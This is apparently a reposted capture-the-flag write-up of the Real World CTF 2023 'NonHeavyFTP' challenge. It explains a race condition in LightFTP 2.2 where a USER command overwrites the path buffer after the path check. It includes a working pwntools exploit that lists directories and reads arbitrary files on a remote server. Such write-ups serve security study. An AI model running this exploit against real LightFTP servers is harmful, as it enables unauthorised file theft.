# Real World CTF 2023 – NonHeavyFTP

> 原文: https://www.ctfiot.com/90436.html
> ID: 90436

This is a short writeup on the “NonHeavyFTP” challenge from Real World CTF 2023. This was one of the easier challenges with the goal of exploiting LightFTP in Version 2.2 (the latest one on github at the time). I ended up with a file-read vulnerability that allowed to read the flag.

Vulnerability Discovery

We are given a compiled binary but there is no need to use it (unless you want to use it for local testing) since the source is on github. In addition, we get the config used on the remote system which only allows anonymous login with read-only permissions:

...

[anonymous]

pswd=*

accs=readonly

...

Unless we can somehow bypass this, we are limited to reading files (and reading the flag is enough to finish this challenge). I started to fuzz the challenge with boofuzz & the FTP fuzzing-script from its author. Unfortunately, this did not yield any results but for documentation’s sake this is how it’s setup:

FTP Fuzzing Script

Boofuzz

# install boofuzz

mkdir boofuzz && cd boofuzz

python3 -m venv env

source env/bin/activate

pip install -U pip setuptools

pip install boofuzz

# start local version of fftp on port 2121

./fftp

# start fuzzer

python3 fuzz.py fuzz --target-port=2121 --target-host=127.0.0.1 --username=anonymous --password=xct

This ran at about 500 exec/s on my VM but required restarting every ~32k sessions because the user limit was reached and increasing it in the config did not help. It did not find any vulnerabilities though. That leaves us with source code review to find something. Looking a bit around for dangerious functions we find a strcpy at https://github.com/hfiref0x/LightFTP/blob/master/Source/ftpserv.c#L265 :

int ftpUSER(PFTPCONTEXT context, const char *params)

{

if ( params == NULL )

return sendstring(context, error501);

context->Access = FTP_ACCESS_NOT_LOGGED_IN;

writelogentry(context, " USER: ", (char *)params);

snprintf(context->FileName, sizeof(context->FileName), "331 User %s OK. Password required\r\n", params);

sendstring(context, context->FileName);

/* Suspicious strcpy */

strcpy(context->FileName, params);

return 1;

}

This looked interesting (e.g. send a large username to overflow the buffer) but it turned out that we can not send a buffer large enough to overflow context->FileName. If we search for other uses of context->FileName , we can see that most FTP commands are actually using this as a buffer to hold different things. At this point I was thinking we might be able to use a race condition to overwrite the contents of this buffer after a function does checks on it, for example:

int ftpLIST(PFTPCONTEXT context, const char *params)

{

...

/* this function makes sure we stay inside the ftp root directory */

ftp_effective_path(context->RootDir, context->CurrentDir, params, sizeof(context->FileName), context->FileName);

while (stat(context->FileName, &filestats) == 0)

{

if ( !S_ISDIR(filestats.st_mode) )

break;

sendstring(context, interm150);

writelogentry(context, " LIST", (char *)params);

context->WorkerThreadAbort = 0;

pthread_mutex_lock(&context->MTLock);

context->WorkerThreadValid = pthread_create(&tid, NULL, (void * (*)(void *))list_thread, context);

if ( context->WorkerThreadValid == 0 )

context->WorkerThreadId = tid;

else

sendstring(context, error451);

pthread_mutex_unlock(&context->MTLock);

return 1;

}

return sendstring(context, error550);

}

If we could overwrite context->FileName after the ftp_effective_path function is called, it would just open the file we want even if its outside the ftp root. This buffer is assigned per connection though, so it’s not possible to overwrite it from a new connection.

There is however a different way that does not rely on a new connection. FTP can be used in passive and active mode. The way this works is, that for FTP there is a command channel and a data channel. In active mode we connect to (usually port 21) the command port and can issue whatever commands we want. If we want to get any data back, the service will connect to a port on our client-machine and send the data. In passive mode, if we connect to the service it will tell us a port on the server-side that we can connect to, to get the data. It turns out active mode is not possible here due to firewall constraints so we have to use passive mode.

If we issue a command in passive mode, like the LIST command in the example above, it will try to send the listing data to the port that was defined when we made the connection. As long as we do not connect there it can however not send the data.

This is the way it sends (after we connect) it via the stor_thread function:

void *stor_thread(PFTPCONTEXT context)

{

...

f = open(context->FileName, O_CREAT | O_RDWR | O_TRUNC, S_IRWXU | S_IRGRP | S_IROTH);

context->File = f;

if (f == -1)

break;

...

return NULL;

}

This function is run as a new thread and is also using context->FileName! This means that we can do the following:

Issue LIST command with some random path, it will get stored in context->FileName. The thread starts but blocks since no connection has been made. As soon as it unblocks it will read context->FileName.

Issue USER command with a crafted username (directory name that we want to list), this will also get stored in context->FileName. Since the thread is still blocked that wants to send the result, we just overwrite the path after the checks were done!

Connect to the FTP data port to allow it to send the data

Exploitation

The flag has a random filename so we start by using our vulnerability to list the contents of the root directory:

from pwn import *

import binascii

context.terminal = ['alacritty', '-e', 'zsh', '-c']

RHOST = b"47.89.253.219"

def init():

p.recvuntil(b"220")

p.sendline(b"USER anonymous")

p.recvuntil(b"331")

p.sendline(b"PASS root")

p.recvuntil(b"230")

p.sendline(b"PASV")

p.recvline()

result = p.recvline().rstrip(b"\r\b")

parts = [int(s) for s in re.findall(r'\b\d+\b', result.decode())]

port = parts[-2]*256+parts[-1]

return port

def read(port):

p = remote(RHOST, port, level='debug')

print(p.recvall(timeout=2))

p.close()

# list dir

p = remote(RHOST, 2121, level='debug')

p.newline = b'\r\n'

port =init()

p.sendline(b"LIST ")  # send LIST command, wants to send us result via data port

p.sendline(b"USER /") # send USER command to overwrite dirname used by LIST

p.recvline()

read(port)

p.recvline()

p.recvline()

p.close()

Running this exploit lists the root directory and yields us the flag name. With the same technique we can now retrieve the flag file (or any file on the system):

...

p = remote(RHOST, 2121, level='debug')

p.newline = b'\r\n'

port =init()

p.sendline(b"RETR hello.txt")

p.sendline(b"USER /flag.deb10154-8cb2-11ed-be49-0242ac110002")

p.recvline()

read(port)

p.recvline()

p.recvline()

p.close()

That’s it for this challenge ?

原文始发于xct：Real World CTF 2023 – NonHeavyFTP